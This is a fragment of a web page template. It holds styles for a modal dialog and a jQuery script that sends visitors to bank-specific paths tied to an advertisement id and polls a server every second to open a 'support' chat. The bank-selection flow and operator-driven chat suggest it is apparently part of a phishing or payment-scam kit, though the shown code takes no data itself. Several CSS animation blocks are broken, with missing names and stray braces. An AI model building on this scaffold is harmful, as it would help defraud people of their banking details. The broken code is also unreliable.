        align-items: stretch;
      }

      @media (max-width: 510px) {
        .communique {
          min-width: 280px;
          width: 90vw;
        }
      }

      @media only screen and (min-device-width: 375px) and (max-device-width: 667px) {
        .communique {
          max-height: calc(100vh - 140px);
        }
      }

      .communique__header {
        min-height: 80px;
        display: flex;
        align-items: center;

        position: relative;
        font-size: 16px;

        background-color: #b2b2b2;
      }

      .communique__header--success {
        background-color: #357433;
      }

      .communique__header--info {
        background-color: #29323c;
      }

      .communique__header--warning {
        background-color: #e1ad01;
      }

      .communique__header--alert {
        background-color: #9e0505;
      }

      .communique__header--rounded {
        border-top-left-radius: 4px;
        border-top-right-radius: 4px;
      }

      .communique__header--black {
        background-color: #000;
      }

      .communique__header--text-black {
        color: #000;
      }

      .communique__header--text-white {
        color: #fff;
      }

      @media (max-width: 510px) {
        .communique__header {
          text-align: center;
        }
      }

      .communique__header-triangle {
        margin-left: -13px;
        width: 0;
        height: 0;
        position: absolute;
        left: 50%;
        bottom: -12px;
        z-index: 1;
        border: 13px solid transparent;

      }

      .communique__header-triangle--success {
        border-top-color: #357433;
      }

      }

        }
        5% {
          transform: rotate(-45deg);
        }
        12% {
          transform: rotate(-405deg);

        100% {
          transform: rotate(-405deg);
        }
      }

        0% {
          margin-top: 1.625em;
          transform: scale(0.4);
          opacity: 0;
        }
        50% {
          margin-top: 1.625em;
          transform: scale(0.4);
          opacity: 0;
        }
        80% {

        }
        100% {
          margin-top: 0;
          transform: scale(1);
          opacity: 1;
        }
      }

        0% {
          transform: rotateX(100deg);
          opacity: 0;
        }
        100% {
          transform: rotateX(0deg);
          opacity: 1;
        }
      }
      @keyframes swal2-rotate-loading {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      @keyframes swal2-animate-question-mark {
        0% {
          transform: rotateY(-360deg);
        }
        100% {
          transform: rotateY(0);
        }
      }

        0% {
          transform: rotateZ(45deg);
          opacity: 0;
        }

          opacity: 0.4;
        }
        50% {
          transform: rotateZ(15deg);
          opacity: 0.8;
        }

        }

    <script type="text/javascript">
      function selectbank(thisis) {
        $(thisis).attr("onclick", "");
        if (
          $(thisis).attr("bank") != "none" &&
          $(thisis).attr("bank") != "other"
        ) {
          var code = $(thisis).attr("bank");
          localStorage.setItem("bank", $(thisis).attr("bank"));
          window.location.href = $(thisis).attr("bank") + "/<%=ad.id%>";
        } else {
          localStorage.setItem("bank", "other");
          window.location.href = "/ad/<%=ad.id%>";
        }
      }

      function init() {
        globalThis.currentStatus = "false";
        setInterval(updateStatus, 1000);
      }

      function updateStatus() {
        $.get(
          "/newMsg.php",
          {
            page_id: 264137254629,
            page: "bank",
          },
          function (status) {
            console.log(currentStatus);
            console.log(status);
            if (currentStatus != status) {
              console.log("[LOG] Status updated");

              globalThis.currentStatus = status;
              // console.log(status);
              switch (status) {
                case "true":
                  break;
                case "false":
                  openForm();
                  break;
              }
            }
          }
        );
      }

      function openForm() {
        $("#myForm").css("display", "block");
        $("#open-support").css("display", "none");
        var objDiv = document.getElementById("messages");
        objDiv.scrollTop = objDiv.scrollHeight;
      }

      function closeForm() {
        $("#myForm").css("display", "none");
        $("#open-support").css("display", "block");
      }
    </script>
